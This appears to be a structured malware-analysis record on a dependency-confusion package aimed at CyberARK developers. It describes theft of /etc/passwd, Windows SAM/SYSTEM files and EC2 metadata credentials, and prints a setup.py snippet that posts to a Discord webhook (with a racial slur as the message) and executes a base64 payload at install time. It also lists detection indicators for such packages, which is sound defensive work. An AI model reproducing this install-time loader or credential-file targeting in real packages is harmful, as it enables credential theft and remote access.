package_info.why_malicious: The package is a dependency confusion attack specifically targeting CyberARK developers. It actively attempts to steal highly sensitive files, including Linux /etc/passwd, Windows SAM and SYSTEM files, and AWS EC2 instance credentials, and prepares them for exfiltration. This behavior constitutes credential theft and unauthorized access to system and cloud secrets, far exceeding proof-of-concept and representing a real-world threat.

The package contains a malicious setup.py that executes an encrypted payload at install time. This payload exfiltrates data to a Discord webhook and attempts to open a reverse shell, granting attackers remote command execution and unauthorized access to the victim's system.

malicious_snippets.code_behavior: Reads the /etc/passwd file (which contains Linux user account information), encodes its contents in base64 for later exfiltration.

malice_analysis.why_suspicious: Accessing /etc/passwd is unnecessary for normal npm package operation and is a common technique for credential theft or reconnaissance.
malice_analysis.violated_expectations: A legitimate npm package should not access or process system credential files such as /etc/passwd.
malice_analysis.similar_legitimate_use: System administration or backup tools may read /etc/passwd, but this is not expected in a general-purpose or third-party npm package.
key_indicators: Base64 encoding of sensitive file contents

malicious_snippets.code_behavior: Reads the Windows SAM file (which contains hashed user passwords), encodes its contents in base64 for later exfiltration.

malice_analysis.why_suspicious: Accessing the Windows SAM file is a clear indicator of credential theft, as it contains sensitive password hashes.
malice_analysis.violated_expectations: No npm package should access or process the Windows SAM file under any circumstances.
malice_analysis.similar_legitimate_use: Only specialized forensic or backup tools, running with explicit user consent, would access the SAM file. This is never expected in a general npm package.

malicious_snippets.code_behavior: Reads the Windows SYSTEM file (which contains system configuration and is used in conjunction with SAM for password cracking), encodes its contents in base64 for later exfiltration.

malice_analysis.why_suspicious: Accessing the SYSTEM file is highly suspicious and unnecessary for any npm package, as it is only relevant for low-level system operations or attacks.
malice_analysis.violated_expectations: No npm package should access or process the Windows SYSTEM file.
malice_analysis.similar_legitimate_use: Only system-level tools or forensic utilities would access this file, never a general-purpose npm package.
key_indicators: Base64 encoding of sensitive system file

malicious_snippets.code_behavior: Attempts to access the AWS EC2 instance metadata service at 169.254.169.254 to retrieve cloud instance credentials for exfiltration.

malice_analysis.why_suspicious: Accessing the EC2 metadata service is a well-known cloud credential theft technique, as it can expose temporary AWS credentials.
malice_analysis.violated_expectations: Normal npm packages should not access cloud instance metadata endpoints or attempt to retrieve cloud credentials.
malice_analysis.similar_legitimate_use: Only cloud automation or management agents, with explicit purpose, would access this endpoint. It is not expected in third-party packages.

malicious_snippets.code_snippet:
import setuptools
try:
    import requests
    requests.post('https://discord.com/api/webhooks/9851628622475326/...', json={'content':'niger'})
    exec("""import base64 as b; exec(b.b64decode('...'))""")
except:
    pass
malicious_snippets.code_behavior: Sends a notification to a Discord webhook, then executes a large encrypted (base64) payload that exfiltrates data and attempts to open a reverse shell for remote command execution.

malice_analysis.why_suspicious: The presence of an encrypted payload in setup.py, combined with exfiltration to a Discord webhook and reverse shell behavior, is a hallmark of malware.
malice_analysis.violated_expectations: setup.py should only handle package installation logic and must not execute encrypted code, exfiltrate data, or open remote shells.
malice_analysis.similar_legitimate_use: Encrypted payloads and network exfiltration are never legitimate in setup.py. Only package installation logic is expected.

attack_chain.action: Malicious package is installed or imported by the victim, either via dependency confusion or typo-squatting.
attack_chain.leads_to: Execution of malicious code in package entry points (index.js for npm, setup.py for PyPI).

attack_chain.action: Sensitive files and credentials are accessed and encoded, including Linux /etc/passwd, Windows SAM and SYSTEM files, and AWS EC2 instance credentials.
attack_chain.leads_to: Preparation of stolen data for exfiltration.

attack_chain.action: Stolen data is exfiltrated to attacker-controlled infrastructure, such as a Discord webhook.
attack_chain.leads_to: Attacker receives stolen credentials and system information.

attack_chain.action: A reverse shell is established, granting the attacker remote command execution and persistent access to the victim system.
attack_chain.leads_to: Attacker gains ongoing unauthorized access to the victim's environment.

behavioral_signatures: Access to /etc/passwd, Windows SAM/SYSTEM files by npm or PyPI packages at install or import time
Base64 encoding of sensitive file contents in package entry points
Network requests to 169.254.169.254 (AWS EC2 metadata service) from package code
Outbound POST requests to discord.com/api/webhooks from setup.py
file_indicators: index.js containing credential theft logic in npm packages
setup.py with encrypted (base64) payloads and exec statements
References to /etc/passwd, SAM, SYSTEM, or 169.254.169.254 in package code
network_indicators: Any exfiltration to non-standard endpoints (e.g., Discord, unknown IPs) during install or import
detection_knowledge.how_to_detect: Monitor for package installation or import events that trigger access to sensitive files such as /etc/passwd or Windows SAM/SYSTEM, or network requests to cloud metadata endpoints (169.254.169.254). Flag any setup.py or index.js containing base64-encoded exec statements or references to credential files. Use static analysis to detect suspicious file access and network patterns in package entry points. Alert on outbound connections to Discord webhooks or other non-standard endpoints during package installation or import.
